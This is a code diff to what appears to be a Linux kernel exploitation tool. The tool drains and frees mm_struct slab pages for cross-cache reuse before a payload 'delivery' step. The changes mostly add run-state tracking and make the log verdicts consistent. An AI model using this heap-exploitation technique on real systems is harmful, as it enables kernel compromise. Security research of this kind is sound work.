@@ -2,6 +2,7 @@
 #include "kernelsnitch/kernelsnitch.h"
 #include "kernel_page.h"
 #include "kernel_page/gate.h"
+#include "kernel_page/run_state.h"
 #include <dirent.h>
 
 /* The emptying free must run on a CPU whose c->page is not base, or
@@ -2272,6 +2273,17 @@ static void release_ctx_children(struct mm_ctx *ctx) {
   }
 }
 
+/* One line per preparation: the lifecycle the run actually recorded, and
+ * whether the reported outcome is supported by it.  Printing only; no branch
+ * above depends on the state machine. */
+static void ks_state_log(const kp_run *run, unsigned long long base) {
+  pr_info("KS_STATE stage=%s outcome=%s samples=%u missing=%u report=%d "
+          "refusal=%s base=%016llx\n",
+          kp_stage_name(run->stage), kp_outcome_name(run->outcome),
+          run->samples, run->missing, kp_run_report_ok(run),
+          run->refusal != NULL ? run->refusal : "none", base);
+}
+
 uintptr_t prepare_kernel_page(int payload_mode) {
   kp_result_reset();
   close_reclaim_sockets();
@@ -3088,6 +3100,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       double free_to_send_ms = -1.0;
       FILE *post_f = NULL;
       int targeted = 0;
+      kp_gate_verdict gate_verdict;
+      kp_run run;
+      int baseline_stable = 0;
+      (void)kp_run_begin(&run, KP_STAGE_DRAIN);
       pin_to_core(CORE);
       /* Close every inherited /proc/<pid>/mem fd and take none on the target.
        * A memfd does hold mm_count via proc_mem_open()'s mmgrab, and
@@ -3461,6 +3477,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
           }
           pr_info("KS_DRAIN pushes=%zu pages=%zu need=%ld proven=%zu cpu=%d\n",
                   pushes, pages_seen, need, proven, sched_getcpu());
+          (void)kp_run_advance(&run, KP_STAGE_BASELINE);
           /* Claimer first, then the baseline: fork() copies the parent's mm,
            * so this process's own mm_struct is one mm-cache allocation and it
            * has to be inside the banked baseline.  Started after it, the +1
@@ -3545,7 +3562,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
               cross_num = qn;
               cross_slabs = qs;
             }
-            pr_info("KS_QUIESCE active=%ld num=%ld slabs=%ld stable=%d\n",
+            baseline_stable = stable;
+            kp_run_sample(&run, cross_active, cross_num, cross_slabs);
+            pr_info("KS_QUIESCE active=%ld num=%ld slabs=%ld stable=%d "
+                    "window=gate\n",
                     cross_active, cross_num, cross_slabs, stable);
           }
           /* The mm free runs inside the child's do_exit() on the CPU that
@@ -3560,6 +3580,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
               pin_bad++;
             }
           }
+          (void)kp_run_advance(&run, KP_STAGE_FREE);
           kill_child(target);
           child_leak = -1;
           /* waitpid() above rescheduled, so this sample is the CPU the close
@@ -3660,6 +3681,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
             (void)mm_slab_scan(post_f, &empty_active, &empty_num,
                                &empty_slabs);
           }
+          (void)kp_run_advance(&run, KP_STAGE_GATE);
+          kp_run_sample(&run, empty_active, empty_num, empty_slabs);
           pr_info("KS_SAMPLE1 tag=crossing active=%ld num=%ld slabs=%ld\n",
                   cross_active, cross_num, cross_slabs);
           pr_info("KS_SAMPLE2 tag=empty active=%ld num=%ld slabs=%ld\n",
@@ -3694,6 +3717,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       if (!target_freed_at_cross) {
         pr_error("KS_DELIVERY skipped=1 reason=no-crossing base=%016zx\n",
                  (size_t)base);
+        (void)kp_run_refuse(&run, "no-crossing");
+        (void)kp_run_finish(&run);
+        ks_state_log(&run, (unsigned long long)base);
         if (post_f != NULL) {
           fclose(post_f);
           post_f = NULL;
@@ -3738,7 +3764,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
        * leaves active_objs, one slab leaves num_objs and slabdata. */
       {
         kp_gate_facts gate_facts;
-        kp_gate_verdict gate_verdict;
         kp_sample gate_before;
         kp_sample gate_after;
 
@@ -3754,6 +3779,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
         gate_facts.want_cpu = (int)EMPTYING_CPU;
         gate_facts.pin_bad = pin_bad;
         gate_facts.slot_partial = slot_partial;
+        gate_facts.baseline_ok = baseline_stable;
         gate_facts.objects_per_slab = (long)mm_objs_per_slab;
         kp_gate_evaluate(&gate_facts, &gate_before, &gate_after, &gate_verdict);
         empty_registered = gate_verdict.registered;
@@ -3781,6 +3807,11 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       /* Identity and consumption cannot be established from here: the run
        * only sees the allocator's accounting, never the page's contents. */
       kp_result_report((uintptr_t)base);
+      if (targeted) {
+        (void)kp_run_deliver(&run);
+        (void)kp_run_finish(&run);
+        ks_state_log(&run, (unsigned long long)base);
+      }
       if (!targeted) {
         /* The precondition visibly failed: the page at base is still part of
          * the mm cache, so the image send would land elsewhere and the punch
@@ -3812,6 +3843,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
                 post_active, post_num, post_slabs);
         pr_error("KS_DELIVERY skipped=1 reason=gate-preconditions "
                  "base=%016zx\n", (size_t)base);
+        (void)kp_run_refuse(&run, "gate-preconditions");
+        (void)kp_run_finish(&run);
+        ks_state_log(&run, (unsigned long long)base);
         release_ctx_children(&lead_ctx);
         release_ctx_children(&post_ctx);
         if (trigger_fds != NULL) {
@@ -3868,27 +3902,27 @@ uintptr_t prepare_kernel_page(int payload_mode) {
               "slabs=%ld->%ld crossed_at=%d\n", free_wait_ms,
               cross_active, post_active, cross_num, post_num,
               cross_slabs, post_slabs, crossed_at);
-      pr_info("KS_DISCARD verdict=%s target_gap=%ld/%ld/%ld expect=-1/-%zu/-1 "
-              "base=%016zx\n",
-              (cross_num > 0 &&
-               post_num == cross_num - (long)mm_objs_per_slab &&
-               post_slabs == cross_slabs - 1)
-                  ? "match"
-                  : "ambiguous",
-              post_active - cross_active,
-              post_num - cross_num,
-              post_slabs - cross_slabs, mm_objs_per_slab,
-              (size_t)base);
+      /* One verdict, one window.  This line used to carry its own predicate
+       * over the post-cleanup sample, which is a different interval from the
+       * gate's and could disagree with KS_GATE in the same log.  It now
+       * restates the gate's verdict and prints the later sample separately. */
+      pr_info("KS_DISCARD verdict=%s window=gate deltas=%ld/%ld/%ld "
+              "expect=-1/-%zu/-1 post=%ld/%ld/%ld base=%016zx\n",
+              gate_verdict.targeted ? "match" : "refused",
+              gate_verdict.d_active, gate_verdict.d_num, gate_verdict.d_slabs,
+              (size_t)mm_objs_per_slab, post_active - cross_active,
+              post_num - cross_num, post_slabs - cross_slabs, (size_t)base);
       pr_info("KS_SAMPLE3 tag=post-send active=%ld num=%ld slabs=%ld\n",
               post_active, post_num, post_slabs);
+      /* d_cross spans the drain, d_empty is the gate window, d_after spans
+       * the post-send cleanup.  gate= is the same verdict KS_GATE printed; the
+       * old discarded= field called flat counters a discard, which is the
+       * opposite of what the counters mean. */
       pr_info("KS_ARITH cross=%ld empty=%ld post=%ld d_cross=%ld d_empty=%ld "
-              "d_send=%ld discarded=%d\n", cross_active, empty_active,
+              "d_after=%ld gate=%d\n", cross_active, empty_active,
               post_active, cross_active - post_isolate_active,
               empty_active - cross_active, post_active - empty_active,
-              (empty_active == cross_active - 1 &&
-               empty_num == cross_num && empty_slabs == cross_slabs)
-                  ? 1
-                  : 0);
+              gate_verdict.targeted);
       pr_info("KS_TARGET_REASON object=freed slab=precondition cpu=%d\n",
               sched_getcpu());
       mm_slab_print("post-drain", post_active, post_num, post_slabs);
